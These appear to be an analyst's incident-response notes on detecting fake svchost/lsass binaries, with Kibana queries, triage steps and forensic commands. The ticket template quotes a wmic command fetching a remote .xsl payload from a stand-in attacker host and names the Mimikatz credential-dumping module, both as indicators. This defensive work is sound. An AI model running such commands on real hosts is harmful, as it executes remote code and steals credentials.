---
author: Yassine S. / IR Analyst
date: 2025-10-14
tags:
  - IR
  - ELK
  - Lucene
  - detection
  - Mimikatz
  - masquerade
Title: Detection and analysis of files/processes masquerading as Windows system processes (svchost.exe, lsass.exe, winlogon.exe, services.exe)
Author: SOC / IR Analyst
Date: 2025-10-14
---

## 1 Executive summary

### Evidence from IR

The following screenshots from the lab dataset have been embedded as evidence. They are included as image embeds (Obsidian-style) so you can copy/paste the markdown into your vault and the images will render if they are present in the same folder.

![[Pasted image 20251014110853.png]]` — **Lucene query / initial hits**: shows the original Lucene query and the initial search results highlighting process image paths named like system processes running from non-standard locations.
    
![[Pasted image 20251014111346.png]]` — **WMIC /.xsl command-line**: demonstrates the `wmic` command invoking a remote `.xsl` file (remote URL visible) which can contain embedded script; supports the RCE vector claim.
    
![[Pasted image 20251014111410.png]]` — **.xsl content or fetched resource**: shows the `.xsl` content or download confirmation where embedded JScript/VBScript is visible (illustrates execution risk when parsed).
    
![[Pasted image 20251014111626.png]]` — **Additional process name examples (services.exe)**: demonstrates `services.exe` and other system-like names appearing outside `\Windows\System32`.
    
![[Pasted image 20251014111743.png]]` — **Sysmon / Event evidence (LSASS read)**: captures the Sysmon Event ID 10 showing ReadProcessMemory on LSASS and related process details.
    
![[Pasted image 20251014111730.png]]` — **Mimikatz indicator**: shows command or module invocation such as `sekurlsa::logonpasswords` and suspicious parent-child process chain (`cmd.exe -> services.exe`).
    
**Severity:** High  
**Confidence:** High

---

## 2 Detection objective

Identify processes whose filename matches common Windows system binaries but that execute from _non-system_ directories (likely masqueraded binaries or living-off-the-land abuse).

**Primary signal:**** `event_data.Image` contains a system binary name while the path **does not** contain `\Windows\System32\` nor `\Windows\SysWOW64\`.

**Secondary signals (correlate):** `event_data.CommandLine` fetching remote `.xsl`/scripts; Sysmon Event ID 10 (ReadProcessMemory on LSASS); suspicious parent-child process combos; network connections to suspicious hosts; file creation events; file hashes.

---

## 3  Problems found in original query & quick fixes

Original Lucene had syntax issues and was too narrow:

- Typo: `Isass.exe` -> `lsass.exe`.
    
- Malformed exclusion quoting and missing `services.exe`.
    
- Depends on tokenization: use `.keyword` or exact path field.
    

Original (intended) sample had errors; see improved queries below.

---

## 4 Improved detection queries

### 4.1 Lucene (Kibana) improved and robust

```
event_data.Image.keyword:(*\\svchost.exe OR *\\lsass.exe OR *\\winlogon.exe OR *\\services.exe)
AND NOT (event_data.Image.keyword:*\\Windows\\System32\\* OR event_data.Image.keyword:*\\Windows\\SysWOW64\\*)
```

> Notes: use `.keyword` (or the exact full-path field) to avoid tokenization issues.

### 4.2 KQL (Kibana Query Language)

```
event_data.Image.keyword: (*\svchost.exe or *\lsass.exe or *\winlogon.exe or *\services.exe)
and not (event_data.Image.keyword:*\Windows\System32\* or event_data.Image.keyword:*\Windows\SysWOW64\*)
```

### 4.3 Add command-line / extension filter (precision)

Flag when command-line indicates remote fetch of `.xsl` and use of `wmic`/`certutil`/`bitsadmin`/`powershell`:

```
( event_data.Image.keyword:(*\svchost.exe OR *\lsass.exe OR *\winlogon.exe OR *\services.exe)
  AND NOT (event_data.Image.keyword:*\Windows\System32\* OR event_data.Image.keyword:*\Windows\SysWOW64\*) )
OR
( event_data.CommandLine:*".xsl"* AND event_data.CommandLine:(*http* OR *https* OR *:\\\\*) )
```

### 4.4 Example Elastic DSL

```json
{ "query": { "bool": { "should": [ { "wildcard": { "event_data.Image.keyword": "*\\svchost.exe" }}, { "wildcard": { "event_data.Image.keyword": "*\\lsass.exe" }}, { "wildcard": { "event_data.Image.keyword": "*\\winlogon.exe" }}, { "wildcard": { "event_data.Image.keyword": "*\\services.exe" }} ], "must_not": [ { "wildcard": { "event_data.Image.keyword": "*\\Windows\\System32\\*" }}, { "wildcard": { "event_data.Image.keyword": "*\\Windows\\SysWOW64\\*" }} ] } } }
```

---

## 5  How to interpret results (triage guidance)

For each hit, collect & correlate:

1. Full `event_data.Image` (absolute path), `event_data.CommandLine`, `event_data.ParentImage`, `event_data.ParentCommandLine`.
    
2. Timestamps, host identifiers (hostname/IP).
    
3. Event IDs: Sysmon/Evtx Process Create (Sysmon 1 / Windows 4688), Sysmon 10 (ReadProcessMemory), network events (3), FileCreate (11).
    
4. File hash (if available) and file creation time.
    
5. Network destinations / URLs used for `.xsl` fetch.
    
6. Search for `sekurlsa::logonpasswords`, `mimikatz` strings, suspicious scheduled tasks/services.
    

**High confidence indicators:** `.xsl` fetched remotely + executed via LOLBin (wmic/etc) AND Sysmon 10 reading LSASS AND unusual parent-child chains.

---

## 6  False positives & tuning

**Potential benign cases:**

- Rare third-party binaries legitimately named similarly.
    
- Lab/dev environments.
    

**Tuning suggestions:**

- Maintain an allowlist of known legitimate software paths.
    
- Alert only when secondary signals exist (network fetch, Sysmon 10, suspicious parent).
    
- Use recency (file created in last N days) and hash reputation to reduce noise.
    

---

## 7 IOC extraction (examples)

- Filenames: `svchost.exe`, `lsass.exe`, `winlogon.exe`, `services.exe` executed from non-system paths.
    
- Remote `.xsl` URLs/domains (from CommandLine) block at network edge.
    
- Parent-child combos: e.g., `cmd.exe -> services.exe`.
    
- Sysmon Event ID 10 reading LSASS PID.
    
- Strings: `sekurlsa::logonpasswords`, `mimikatz`.
    

Store IOCs in the case ticket and push to EDR / firewall / proxy where appropriate.

---

## 8  TTP mapping (MITRE ATT&CK)

**Mappings**:
- **T1218** Signed Binary Proxy Execution (wmic/regsvr32, etc.)
- **T1055** Process Injection (if present)
- **T1003** Credential Dumping (Mimikatz / LSASS read)
- **T1105** Ingress Tool Transfer (retrieving `.xsl`)
- **T1071** Application Layer Protocol (HTTP/HTTPS fetch)
    

---

## 9 Immediate containment & triage playbook (step-by-step)

**Step 0 follow org incident response process.**

1. **Triage & isolate**: Quarantine / isolate host via EDR or network segmentation.
    
2. **Volatile collection**: Capture memory image (preserve LSASS/mimikatz artifacts).
    
3. **Gather logs & artifacts**: Export Windows Event Logs, Sysmon logs, and ELK raw events for timeframe.
    
4. **Identify & block IOCs**: Block remote domains/IPs and push hashes to EDR blocklists.
    
5. **Investigate lateral movement & accounts**: Look for new privileged accounts, scheduled tasks, persistence.
    
6. **Clean & remediate**: Remove malicious files / services; reimage host if credential theft confirmed.
    
7. **Post-incident**: Rotate credentials, rotate certificates, enforce MFA, update detections.
    

---

## 10 Forensic collection commands & quick copies

**Export Windows event logs (example)**

```powershell
wevtutil epl Security C:\forensics\security.evtx /q:"*[System[TimeCreated[@SystemTime>='2025-10-12T00:00:00.000Z']]]"
wevtutil epl Application C:\forensics\application.evtx
wevtutil epl System C:\forensics\system.evtx
```

**Sysmon process create export**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1; StartTime=(Get-Date).AddDays(-7)} | Export-Clixml C:\forensics\sysmon_proccreate.xml
```

**Search for .xsl in commandlines (ELK / host)**

```powershell
# On host (authorized only):
Get-ChildItem -Path C:\ -Recurse -Include *.xsl -ErrorAction SilentlyContinue
```

> Use EDR/forensic tooling for non-destructive enterprise searches.

---

## 11 Recommended improvements to detection posture

1. Ensure process-create events include full `Image`, `CommandLine`, `ParentImage`, `ParentCommandLine` stored as `keyword`.
    
2. Deploy Sysmon across endpoints (Events: 1, 3, 10, 11, etc.).
    
3. Create a correlation rule: `(masquerade-name AND non-system-path) AND (network fetch OR Sysmon 10 OR suspicious parent)`.
    
4. Integrate file reputation (VirusTotal) into enrichment in ELK.
    
5. Maintain and review allowlist of legitimate software with system-like names.
    

---

## 12 Example alert / incident summary (SOC ticket template)

**Title:** Masqueraded system binary + remote .xsl fetch and LSASS read probable credential dumping (Mimikatz)  
**Time:** [first_seen timestamp] [last_seen timestamp]  
**Hosts impacted:** host01.example.local (add others)  
**Key evidence:** `event_data.Image` = `C:\Users\Public\svchost.exe` (not System32), `event_data.CommandLine` contains `wmic ... /format:http://evil.example/payload.xsl`, Sysmon EventID 10 reading LSASS, process create `cmd.exe -> services.exe`, `sekurlsa::logonpasswords` in activity; file hash: `<hash>`  
**Action taken:** Host isolated; memory captured; network indicators blocked; credentials rotated.  
**Status:** Remediation in progress / Host reimage recommended.

---

## 13 Hunting roadmap (follow-ups)

- Hunt for other hosts with `Image` name mismatches over last 30/90 days.
- Search for `.xsl` fetches, `wmic` remote format strings, `certutil`/`powershell -enc` with remote URLs.
- Hunt Sysmon 10 events across estate and correlate with non-system image paths.
- Check proxy/NGFW logs for connections to found domains.
- Search for RDP or lateral movement indicators.
    

---

## 14 Conclusion

This activity is an active, high-risk compromise combining remote script retrieval/execution and credential dumping. Immediate containment and forensic preservation are required. Implement the improved Lucene/KQL queries into Kibana as a saved detection and create a correlation rule to escalate on co-occurring secondary signals.
